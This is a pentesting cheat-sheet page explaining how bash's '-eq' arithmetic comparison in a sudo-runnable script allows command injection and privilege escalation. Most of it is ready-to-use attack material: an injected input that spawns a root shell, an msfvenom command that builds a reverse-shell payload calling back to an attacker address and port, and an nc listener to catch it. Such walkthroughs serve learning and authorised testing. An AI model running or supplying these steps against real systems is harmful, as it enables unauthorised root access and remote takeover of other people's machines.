# Bash eq Privilege Escalation

The `-eq` comaparison in bash script is vulnerable to arbitrary command execution.

### Investigation <a href="#investigation" id="investigation"></a>

Please see [this post](https://www.vidarholen.net/contents/blog/?p=716) for details.

```shellscript
sudo -l

(root) /bin/bash /opt/example.sh
```

If we can execute above command as root, and the **`/opt/example.sh`** contains the numeric comparison such as **`[[ $var -eq 42 ]]`**, we can execute arbitrary command.

```shellscript
#!/bin/bash

read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```

To execute arbitrary command, answer this question as below.

```
sudo /bin/bash /opt/example.sh
Enter guess: a[$(date >&2)]+42
Sun Feb  4 19:06:19 PST 2018
Correct
```

inject arbitrary command before the correct number (**42**).

### Exploitation (Get a Shell Directly) <a href="#exploitation-get-a-shell-directly" id="exploitation-get-a-shell-directly"></a>

It’s easy if we can execute the bash script as root.\
We only need to insert **`/bin/sh`** or **`/bin/bash`** command in the answer.

```
sudo /bin/bash /opt/example.sh
Enter guess: a[$(/bin/sh >&2)]+42
$
```

### Exploitation (Get a Shell Indirectly) <a href="#exploitation-get-a-shell-indirectly" id="exploitation-get-a-shell-indirectly"></a>

We can also inject a bash script and execute arbitrary code.\
First, create a reverse shell script **`/tmp/shell.elf`** using **msfvenom**.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell.elf
chmod +x /tmp/shell.elf
```

Then start a listener in local machine.

```
nc -lvnp 4444
```

Now execute the bash script as root.

```
sudo /bin/bash /opt/example.sh
Enter guess: a[$(/tmp/shell.elf)]+42
```

We should get a root shell in local terminal.

### References <a href="#references" id="references"></a>

* [Vidar's Blog](https://www.vidarholen.net/contents/blog/?p=716)
